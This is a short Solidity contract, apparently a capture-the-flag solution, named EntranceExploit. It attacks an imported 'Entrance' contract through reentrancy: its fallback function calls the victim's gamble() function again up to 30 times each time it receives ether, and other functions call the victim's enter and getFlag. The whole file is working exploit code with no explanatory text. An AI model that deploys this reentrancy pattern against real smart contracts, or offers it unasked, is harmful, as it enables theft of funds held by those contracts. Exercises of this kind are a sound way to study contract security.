pragma solidity >=0.4.21 <0.6.0;

import "./Entrance.sol";

contract EntranceExploit {
  Entrance victim;
  uint256 public count;

  constructor(address _victim) public {
    victim = Entrance(_victim);
  }

  function enter(uint256 _pin) public {
    victim.enter(_pin);
  }

  function attack() public {
      count = 0;
      victim.gamble();
  }

  function getFlag(string memory _server, string memory _port) public {
      victim.getFlag(_server, _port);
  }

  function() external payable {
      if (count < 30) {
          count++;
          victim.gamble();
      }
  }

}
